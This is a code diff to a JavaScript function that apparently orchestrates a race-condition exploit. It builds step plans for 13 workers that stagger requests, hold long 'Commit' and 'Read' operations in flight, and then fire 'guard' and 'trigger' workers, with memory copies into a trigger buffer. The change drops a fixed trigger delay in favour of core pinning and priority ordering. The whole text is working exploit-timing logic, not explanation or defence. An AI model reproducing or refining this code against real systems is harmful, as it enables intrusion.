@@ -33,6 +33,11 @@ const {
 
 // ── Wave planning and configuration ───────────────────────────────────────
 
+// Workers are pinned to one core with decreasing priorities so
+// dispatch order is deterministic. roleDelays are kept so server-side
+// processing overlaps correctly: without them, all 10 initial requests
+// arrive as a burst and the server finishes the quick ones before
+// W9's sequential sends let the guards/trigger fire.
 export function buildPlans(input) {
     const config = input.config;
     let REQ = input.REQ;
@@ -44,23 +49,40 @@ export function buildPlans(input) {
     let rootSession = input.rootSession;
     let triggerBuf = input.triggerBuf;
     var plans = [];
+
     for (var i = 0; i < 13; i++) {
         var steps = [WAIT(gates.masterGate)];
+
+        // W0-W9: stagger with roleDelays for server-side overlap.
+        // Priority ordering guarantees dispatch order within the
+        // same delay bucket; the delays give long operations (Commit,
+        // Read) a head start so they are still in-flight when the
+        // guards and trigger fire.
         if (i < 10) {
             steps.push(SLEEP(config.roleDelays[i]));
-        } else if (i < 12) {
+        }
+
+        // W10-W11 (guards): gate-based, same as timed.
+        if (i >= 10 && i < 12) {
             steps.push(WAIT(gates.groupReleasedGate));
             steps.push(SLEEP(config.guardDelays[i - 10]));
-        } else {
-            // CivSwitchFS original: 1.6 ms; Slapah/Kurumuz reference: 2.4 ms.
-            steps.push(SLEEP(1600000));
+        }
+
+        // W12 (trigger): gate-based with abort-guard sampling.
+        // No initial sleep: on a single core with the lowest priority,
+        // W12 cannot run until all others are blocked. The gate
+        // already synchronises with W9's release signal.
+        if (i === 12) {
             steps.push(WAIT(gates.groupReleasedGate));
             steps.push(WAIT(gates.guardLaunchedGate));
             steps.push(SLEEP(400000));
-            steps.push(MCPY(gates.spacingDecision, gates.bottleneckFinished, 4));
+            steps.push(MCPY(gates.spacingDecision,
+                gates.bottleneckFinished, 4));
             steps.push(WAIT(gates.bottleneckDoneGate));
-            steps.push(MCPY(gates.sampledCompleted, gates.completedFlag, 4));
-            steps.push(MCPY(gates.sampledEarlyHole, gates.earlyHole, 4));
+            steps.push(MCPY(gates.sampledCompleted,
+                gates.completedFlag, 4));
+            steps.push(MCPY(gates.sampledEarlyHole,
+                gates.earlyHole, 4));
             steps.push(MCPY(0n, gates.sampledCompleted, 4));
             steps.push(MCPY(triggerBuf, gates.zeroByte, 0));
             steps.push(MCPY(0n, gates.sampledEarlyHole, 4));
@@ -68,29 +90,45 @@ export function buildPlans(input) {
             steps.push(MCPY(0n, gates.spacingDecision, 4));
             steps.push(MCPY(triggerBuf, gates.zeroByte, 0));
         }
+
+        // W9 (release): pin, clear, pre-release probes before its main send.
         if (i === 9) {
             steps.push(TICK(), SEND(pinPkt, rootSession), TICK());
             steps.push(TICK(), SEND(clearPkt, rootSession), TICK());
             steps.push(TICK(), SEND(prePkt, rootSession), TICK());
         }
+
+        // W11: sample bottleneck state and signal the trigger.
         if (i === 11) {
-            steps.push(MCPY(gates.earlyHole, gates.bottleneckFinished, 4));
+            steps.push(MCPY(gates.earlyHole,
+                gates.bottleneckFinished, 4));
             steps.push(SIGNAL(gates.guardLaunchedGate));
         }
+
+        // Every worker: timestamp → send → timestamp.
         steps.push(TICK());
         steps.push(SEND(REQ[i], roleHandles[i]));
         steps.push(TICK());
+
+        // Post-send signals (identical to the timed version).
         if (i === 1) {
             steps.push(SETB(gates.bottleneckFinished, 1));
             steps.push(SIGNAL(gates.bottleneckDoneGate));
         }
-        if (i === 9) steps.push(SIGNAL(gates.groupReleasedGate));
-        if (i === 0 || (i >= 2 && i <= 8) || i === 10 || i === 11) {
+
+        if (i === 9) {
+            steps.push(SIGNAL(gates.groupReleasedGate));
+        }
+
+        if (i === 0 || (i >= 2 && i <= 8) ||
+            i === 10 || i === 11) {
             steps.push(SETB(gates.completedFlag, 1));
             steps.push(SETB(gates.roleDoneFlags + BigInt(i), 1));
         }
+
         plans.push(steps);
     }
+
     return plans;
 }
 
